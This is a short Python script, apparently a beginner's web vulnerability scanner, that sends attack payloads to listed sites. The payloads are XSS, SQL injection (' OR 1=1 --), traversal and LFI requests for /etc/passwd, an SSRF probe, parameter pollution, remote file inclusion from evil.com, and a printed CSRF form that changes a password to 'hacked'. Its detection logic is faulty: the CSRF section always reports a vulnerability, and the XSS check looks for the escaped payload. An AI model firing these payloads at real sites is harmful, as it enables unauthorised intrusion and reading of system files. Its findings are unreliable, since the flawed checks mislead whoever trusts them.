import requests        # Import the required lib
import urllib.parse    # Import the required lib

#Here you can add multiple url to get scaned 

target_urls = [
    "Add URL",   # Add URL here inside " "
    "Add URL",   # Add URL here inside " "
    "Add URL"    # Add URL here inside " "
]

# This for loop allows the prg to run each vulneability test on the input urls

for target_url in target_urls:
    try:
        response = requests.get(target_url)    # Sending a get request to the url

        if response.status_code == 200:
            print("Website is accessible.")

            # Check for XSS (with proper payload escaping)
            escaped_payload = urllib.parse.quote_plus("<script>alert('XSS Test')</script>")
            vulnerable_url = target_url + "/search?q=" + escaped_payload
            response = requests.get(vulnerable_url)

            if escaped_payload in response.text:
                print("Potential XSS vulnerability found!")
            else:
                print("No XSS vulnerability detected.")
            
            # Check for sql injection
            payload = "' OR 1=1 -- "  # A sql statement
            vulnerable_url = target_url + "/login?username=" + payload + "&password=test"

            response = requests.get(vulnerable_url)

            if "Welcome" in response.text:
                print("Potential SQL injection vulnerability found!")
            else:
                print("No SQL injection vulnerability detected.")
            
                        # Check for Directory Traversal 
            payload = "../../../../../../etc/passwd"  # Attempt to access a sensitive file
            vulnerable_url = target_url + "/download?file=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "root:" in response.text:
                print("Potential directory traversal vulnerability found!")
            else:
                print("No directory traversal vulnerability detected.")
            
            # Check for CSRF (Cross-Site Request Forgery)
            # Requires crafting a CSRF exploit and checking if it's executed
            # Simulation of a CSRF attack with a simple form submission:
            
            csrf_payload = "<form action='" + target_url + "/change_password' method='POST'>\n<input type='hidden' name='new_password' value='hacked'>\n<input type='submit' value='Submit'>\n</form>"
            
            print("Potential CSRF vulnerability found! Try to exploit it with this payload:")
            print(csrf_payload)
            
            # Check for SSRF (Server-Side Request Forgery )
            payload = "http://internal.example.com"  # Attempt to access an internal resource
            vulnerable_url = target_url + "/fetch_data?url=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "Internal Server Error" in response.text:
                print("Potential SSRF vulnerability found!")
            else:
                print("No SSRF vulnerability detected.")
            
            # Check for HPP (HTTP Parameter Pollution)
            payload = "?username=test&username=admin"  # Duplicate parameter with different values
            vulnerable_url = target_url + "/login" + payload
            
            response = requests.get(vulnerable_url)
            
            if "Welcome, admin" in response.text:  # Check for unexpected behavior
                print("Potential HPP vulnerability found!")
            else:
                print("No HPP vulnerability detected.")
            
            # Check for RFI (Remote File Inclusion)
            payload = "http://evil.com/exploit.txt"  # Attempt to load a remote file
            vulnerable_url = target_url + "/include?file=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "Content of exploit.txt" in response.text:  # Check for successful inclusion
                print("Potential RFI vulnerability found!")
            else:
                print("No RFI vulnerability detected.")
            
            # Check for LFI (Local File Inclusion)
            payload = "../../../../../etc/passwd"  # Attempt to access a local file
            vulnerable_url = target_url + "/include?file=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "root:" in response.text:  # Check for successful inclusion of sensitive file
                print("Potential LFI vulnerability found!")
            else:
                print("No LFI vulnerability detected.")
            
        else:
            print("Website is not accessible. Status code:", response.status_code)

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
